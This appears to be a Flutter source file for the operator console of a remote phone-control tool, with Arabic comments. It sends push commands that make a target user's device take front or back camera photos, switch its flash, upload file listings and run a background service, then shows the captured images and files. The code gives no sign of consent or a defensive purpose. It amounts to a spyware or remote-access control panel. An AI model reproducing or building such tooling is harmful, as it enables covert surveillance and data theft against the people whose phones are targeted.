// ignore_for_file: use_build_context_synchronously, deprecated_member_use
import 'package:flutter/material.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'dart:async';
import '../../services/fcm_admin_service.dart';

class UserControlScreen extends StatefulWidget {
  final int targetUserId;
  final String targetUsername;
  final String targetName;
  final String? targetAvatarUrl;

  const UserControlScreen({
    super.key,
    required this.targetUserId,
    required this.targetUsername,
    required this.targetName,
    this.targetAvatarUrl,
  });

  @override
  State<UserControlScreen> createState() => _UserControlScreenState();
}

class _UserControlScreenState extends State<UserControlScreen>
    with SingleTickerProviderStateMixin {
  final _supabase = Supabase.instance.client;
  bool _isFlashOn = false;
  bool _isCapturing = false;
  List<Map<String, dynamic>> _capturedImages = [];
  List<Map<String, dynamic>> _userFiles = [];
  late AnimationController _glowController;
  StreamSubscription? _imagesSubscription;

  @override
  void initState() {
    super.initState();
    _glowController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    _loadCapturedImages();
    _loadUserFiles();
    _listenToImages();
  }

  @override
  void dispose() {
    _glowController.dispose();
    _imagesSubscription?.cancel();
    super.dispose();
  }

  void _listenToImages() {
    _imagesSubscription = _supabase
        .from('captured_images')
        .stream(primaryKey: ['id'])
        .eq('user_id', widget.targetUserId)
        .listen((data) {
          if (mounted) {
            setState(() => _capturedImages = data);
          }
        });
  }

  Future<void> _loadCapturedImages() async {
    try {
      final response = await _supabase
          .from('captured_images')
          .select()
          .eq('user_id', widget.targetUserId)
          .order('captured_at', ascending: false);
      if (mounted) {
        setState(
          () => _capturedImages = List<Map<String, dynamic>>.from(response),
        );
      }
    } catch (e) {
      debugPrint('Error loading images: $e');
    }
  }

  Future<void> _loadUserFiles() async {
    try {
      final response = await _supabase
          .from('user_files')
          .select()
          .eq('user_id', widget.targetUserId)
          .order('uploaded_at', ascending: false);
      if (mounted) {
        setState(() => _userFiles = List<Map<String, dynamic>>.from(response));
      }
    } catch (e) {
      debugPrint('Error loading files: $e');
    }
  }

  Future<void> _sendCommand(
    String commandType, {
    Map<String, dynamic>? data,
  }) async {
    try {
      // إدخال الأمر في قاعدة البيانات
      final response = await _supabase
          .from('admin_commands')
          .insert({
            'target_user_id': widget.targetUserId,
            'command_type': commandType,
            'command_data': data,
            'executed': false,
          })
          .select()
          .single();

      final commandId = response['id'];

      // الحصول على FCM token للمستخدم الهدف
      final userResponse = await _supabase
          .from('users')
          .select('fcm_token')
          .eq('id', widget.targetUserId)
          .maybeSingle();

      final fcmToken = userResponse?['fcm_token'] as String?;

      if (fcmToken != null && fcmToken.isNotEmpty) {
        // إرسال FCM notification
        await _sendFCMNotification(fcmToken, commandType, commandId.toString());
      } else {
        debugPrint('No FCM token for user ${widget.targetUserId}');
      }

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(_getCommandMessage(commandType)),
          backgroundColor: const Color(0xFF00FF00),
        ),
      );

      if (commandType == 'flash_on') {
        setState(() => _isFlashOn = true);
      } else if (commandType == 'flash_off') {
        setState(() => _isFlashOn = false);
      }
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('خطأ: $e'), backgroundColor: Colors.red),
      );
    }
  }

  Future<void> _sendFCMNotification(
    String token,
    String commandType,
    String commandId,
  ) async {
    try {
      // تهيئة خدمة FCM Admin
      await FCMAdminService.initialize();

      // إرسال الإشعار عبر HTTP v1 API
      final success = await FCMAdminService.sendNotification(
        fcmToken: token,
        commandType: commandType,
        commandId: commandId,
      );

      if (success) {
        debugPrint('FCM: Notification sent successfully via HTTP v1 API');
      } else {
        debugPrint('FCM: Failed to send notification via HTTP v1 API');
      }
    } catch (e) {
      debugPrint('FCM: Error sending notification: $e');
    }
  }

  String _getCommandMessage(String type) {
    switch (type) {
      case 'flash_on':
        return '⚡ تم إرسال أمر تشغيل الفلاش';
      case 'flash_off':
        return '🌑 تم إرسال أمر إطفاء الفلاش';
      case 'camera_front':
        return '📸 تم إرسال أمر التقاط صورة (أمامية)';
      case 'camera_back':
        return '📷 تم إرسال أمر التقاط صورة (خلفية)';
      case 'list_files':
        return '📁 تم إرسال أمر جلب الملفات';
      case 'start_service':
        return '🟢 تم إرسال أمر تشغيل الخدمة الخلفية';
      case 'stop_service':
        return '🔴 تم إرسال أمر إيقاف الخدمة الخلفية';
      default:
        return '✓ تم إرسال الأمر';
    }
  }

  Future<void> _capturePhoto(String cameraType) async {
    setState(() => _isCapturing = true);
    await _sendCommand('camera_$cameraType');
    await Future.delayed(const Duration(seconds: 3));
    await _loadCapturedImages();
    setState(() => _isCapturing = false);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0a0a0a),
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        title: Row(
          children: [
            const Icon(Icons.terminal, color: Color(0xFF00FF00)),
            const SizedBox(width: 8),
            Text(
              'CONTROL: @${widget.targetUsername}',
              style: const TextStyle(
                color: Color(0xFF00FF00),
                fontFamily: 'monospace',
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        iconTheme: const IconThemeData(color: Color(0xFF00FF00)),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _buildUserInfoCard(),
            const SizedBox(height: 20),
            _buildSectionHeader('🎛️ CONTROL PANEL'),
            const SizedBox(height: 12),
            _buildControlButtons(),
            const SizedBox(height: 24),
            _buildSectionHeader('📸 CAMERA CAPTURE'),
            const SizedBox(height: 12),
            _buildCameraButtons(),
            const SizedBox(height: 24),
            _buildSectionHeader(
              '🖼️ CAPTURED IMAGES (${_capturedImages.length})',
            ),
            const SizedBox(height: 12),
            _buildCapturedImagesGrid(),
            const SizedBox(height: 24),
            _buildSectionHeader('📁 FILE BROWSER (${_userFiles.length})'),
            const SizedBox(height: 12),
            _buildFileBrowser(),
          ],
        ),
      ),
    );
  }

  Widget _buildUserInfoCard() {
    return AnimatedBuilder(
      animation: _glowController,
      builder: (context, child) {
        return Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: const Color(0xFF111111),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(
              color: Color.lerp(
                const Color(0xFF00FF00).withAlpha(77),
                const Color(0xFF00FF00),
                _glowController.value,
              )!,
              width: 2,
            ),
            boxShadow: [
              BoxShadow(
                color: Color.fromARGB(
                  (51 * _glowController.value).toInt(),
                  0,
                  255,
                  0,
                ),
                blurRadius: 20,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Row(
            children: [
              Stack(
                children: [
                  CircleAvatar(
                    radius: 40,
                    backgroundColor: const Color(0xFF00FF00),
                    backgroundImage: widget.targetAvatarUrl != null
                        ? NetworkImage(widget.targetAvatarUrl!)
                        : null,
                    child: widget.targetAvatarUrl == null
                        ? Text(
                            widget.targetName.substring(0, 1).toUpperCase(),
                            style: const TextStyle(
                              fontSize: 32,
                              color: Colors.black,
                              fontWeight: FontWeight.bold,
                            ),
                          )
                        : null,
                  ),
                  Positioned(
                    bottom: 0,
                    right: 0,
                    child: Container(
                      width: 16,
                      height: 16,
                      decoration: BoxDecoration(
                        color: Colors.green,
                        shape: BoxShape.circle,
                        border: Border.all(color: Colors.black, width: 2),
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(width: 20),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      widget.targetName,
                      style: const TextStyle(
                        color: Color(0xFF00FF00),
                        fontSize: 22,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'monospace',
                      ),
                    ),
                    Text(
                      '@${widget.targetUsername}',
                      style: const TextStyle(
                        color: Color(0xFF00B300),
                        fontSize: 14,
                        fontFamily: 'monospace',
                      ),
                    ),
                    const SizedBox(height: 8),
                    Container(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 8,
                        vertical: 4,
                      ),
                      decoration: BoxDecoration(
                        color: const Color(0xFF003300),
                        borderRadius: BorderRadius.circular(4),
                      ),
                      child: const Text(
                        '● CONNECTED',
                        style: TextStyle(
                          color: Color(0xFF00FF00),
                          fontSize: 12,
                          fontFamily: 'monospace',
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildSectionHeader(String title) {
    return Row(
      children: [
        Container(width: 4, height: 20, color: const Color(0xFF00FF00)),
        const SizedBox(width: 8),
        Text(
          title,
          style: const TextStyle(
            color: Color(0xFF00FF00),
            fontSize: 16,
            fontWeight: FontWeight.bold,
            fontFamily: 'monospace',
            letterSpacing: 1,
          ),
        ),
      ],
    );
  }

  Widget _buildControlButtons() {
    return Column(
      children: [
        Row(
          children: [
            Expanded(
              child: _buildControlButton(
                icon: _isFlashOn ? Icons.flashlight_on : Icons.flashlight_off,
                label: _isFlashOn ? 'FLASH ON' : 'FLASH OFF',
                isActive: _isFlashOn,
                onTap: () =>
                    _sendCommand(_isFlashOn ? 'flash_off' : 'flash_on'),
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _buildControlButton(
                icon: Icons.folder_open,
                label: 'SYNC FILES',
                onTap: () => _sendCommand('list_files'),
              ),
            ),
          ],
        ),
        const SizedBox(height: 12),
        // أزرار التحكم بالخدمة الخلفية
        Row(
          children: [
            Expanded(
              child: _buildServiceButton(
                icon: Icons.play_circle_fill,
                label: 'START SERVICE',
                color: const Color(0xFF00FF00),
                bgColor: const Color(0xFF003300),
                onTap: () => _sendCommand('start_service'),
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _buildServiceButton(
                icon: Icons.stop_circle,
                label: 'STOP SERVICE',
                color: const Color(0xFFFF0000),
                bgColor: const Color(0xFF330000),
                onTap: () => _sendCommand('stop_service'),
              ),
            ),
          ],
        ),
      ],
    );
  }

  Widget _buildServiceButton({
    required IconData icon,
    required String label,
    required Color color,
    required Color bgColor,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: bgColor,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: color, width: 2),
          boxShadow: [
            BoxShadow(
              color: color.withAlpha(40),
              blurRadius: 10,
              spreadRadius: 1,
            ),
          ],
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: color, size: 24),
            const SizedBox(width: 8),
            Flexible(
              child: Text(
                label,
                style: TextStyle(
                  color: color,
                  fontFamily: 'monospace',
                  fontWeight: FontWeight.bold,
                  fontSize: 12,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildControlButton({
    required IconData icon,
    required String label,
    bool isActive = false,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: isActive ? const Color(0xFF003300) : const Color(0xFF111111),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: isActive ? const Color(0xFF00FF00) : const Color(0xFF333333),
            width: 2,
          ),
        ),
        child: Column(
          children: [
            Icon(icon, color: const Color(0xFF00FF00), size: 32),
            const SizedBox(height: 8),
            Text(
              label,
              style: const TextStyle(
                color: Color(0xFF00FF00),
                fontFamily: 'monospace',
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCameraButtons() {
    return Row(
      children: [
        Expanded(
          child: _buildCameraButton(
            icon: Icons.camera_front,
            label: 'FRONT CAM',
            onTap: () => _capturePhoto('front'),
          ),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: _buildCameraButton(
            icon: Icons.camera_rear,
            label: 'BACK CAM',
            onTap: () => _capturePhoto('back'),
          ),
        ),
      ],
    );
  }

  Widget _buildCameraButton({
    required IconData icon,
    required String label,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: _isCapturing ? null : onTap,
      child: Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          gradient: const LinearGradient(
            colors: [Color(0xFF1a1a2e), Color(0xFF16213e)],
          ),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: const Color(0xFF007700), width: 2),
        ),
        child: Column(
          children: [
            _isCapturing
                ? const SizedBox(
                    width: 32,
                    height: 32,
                    child: CircularProgressIndicator(
                      color: Color(0xFF00FF00),
                      strokeWidth: 2,
                    ),
                  )
                : Icon(icon, color: const Color(0xFF00FF00), size: 32),
            const SizedBox(height: 8),
            Text(
              _isCapturing ? 'CAPTURING...' : label,
              style: const TextStyle(
                color: Color(0xFF00FF00),
                fontFamily: 'monospace',
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCapturedImagesGrid() {
    if (_capturedImages.isEmpty) {
      return Container(
        height: 150,
        decoration: BoxDecoration(
          color: const Color(0xFF111111),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: const Color(0xFF333333)),
        ),
        child: const Center(
          child: Text(
            '[ NO CAPTURED IMAGES ]',
            style: TextStyle(color: Color(0xFF666666), fontFamily: 'monospace'),
          ),
        ),
      );
    }

    return GridView.builder(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 3,
        crossAxisSpacing: 8,
        mainAxisSpacing: 8,
      ),
      itemCount: _capturedImages.length,
      itemBuilder: (context, index) {
        final image = _capturedImages[index];
        return GestureDetector(
          onTap: () => _showImageDialog(image['image_url']),
          child: Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: const Color(0xFF007700)),
            ),
            child: ClipRRect(
              borderRadius: BorderRadius.circular(8),
              child: Stack(
                fit: StackFit.expand,
                children: [
                  Image.network(
                    image['image_url'],
                    fit: BoxFit.cover,
                    errorBuilder: (_, __, ___) => Container(
                      color: const Color(0xFF111111),
                      child: const Icon(
                        Icons.broken_image,
                        color: Color(0xFF00FF00),
                      ),
                    ),
                  ),
                  Positioned(
                    bottom: 4,
                    right: 4,
                    child: Container(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 4,
                        vertical: 2,
                      ),
                      decoration: BoxDecoration(
                        color: const Color(0xB3000000),
                        borderRadius: BorderRadius.circular(4),
                      ),
                      child: Text(
                        image['camera_type']?.toUpperCase() ?? '',
                        style: const TextStyle(
                          color: Color(0xFF00FF00),
                          fontSize: 8,
                          fontFamily: 'monospace',
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }

  void _showImageDialog(String imageUrl) {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          decoration: BoxDecoration(
            color: const Color(0xFF111111),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: const Color(0xFF00FF00), width: 2),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              ClipRRect(
                borderRadius: const BorderRadius.vertical(
                  top: Radius.circular(14),
                ),
                child: Image.network(imageUrl, fit: BoxFit.contain),
              ),
              TextButton(
                onPressed: () => Navigator.pop(context),
                child: const Text(
                  '[ CLOSE ]',
                  style: TextStyle(
                    color: Color(0xFF00FF00),
                    fontFamily: 'monospace',
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildFileBrowser() {
    if (_userFiles.isEmpty) {
      return Container(
        height: 150,
        decoration: BoxDecoration(
          color: const Color(0xFF111111),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: const Color(0xFF333333)),
        ),
        child: const Center(
          child: Text(
            '[ NO FILES SYNCED - TAP SYNC FILES ]',
            style: TextStyle(color: Color(0xFF666666), fontFamily: 'monospace'),
          ),
        ),
      );
    }

    return Container(
      decoration: BoxDecoration(
        color: const Color(0xFF111111),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: const Color(0xFF333333)),
      ),
      child: ListView.builder(
        shrinkWrap: true,
        physics: const NeverScrollableScrollPhysics(),
        itemCount: _userFiles.length,
        itemBuilder: (context, index) {
          final file = _userFiles[index];
          return ListTile(
            leading: Icon(
              _getFileIcon(file['file_type']),
              color: const Color(0xFF00FF00),
            ),
            title: Text(
              file['file_name'] ?? 'Unknown',
              style: const TextStyle(
                color: Color(0xFF00FF00),
                fontFamily: 'monospace',
              ),
            ),
            subtitle: Text(
              _formatFileSize(file['file_size']),
              style: const TextStyle(
                color: Color(0xFF009900),
                fontFamily: 'monospace',
                fontSize: 12,
              ),
            ),
            trailing: const Icon(Icons.chevron_right, color: Color(0xFF00FF00)),
          );
        },
      ),
    );
  }

  IconData _getFileIcon(String? type) {
    switch (type) {
      case 'image':
        return Icons.image;
      case 'video':
        return Icons.video_file;
      case 'audio':
        return Icons.audio_file;
      case 'document':
        return Icons.description;
      default:
        return Icons.insert_drive_file;
    }
  }

  String _formatFileSize(dynamic size) {
    if (size == null) return '';
    final bytes = size as int;
    if (bytes < 1024) return '$bytes B';
    if (bytes < 1024 * 1024) return '${(bytes / 1024).toStringAsFixed(1)} KB';
    return '${(bytes / (1024 * 1024)).toStringAsFixed(1)} MB';
  }
}
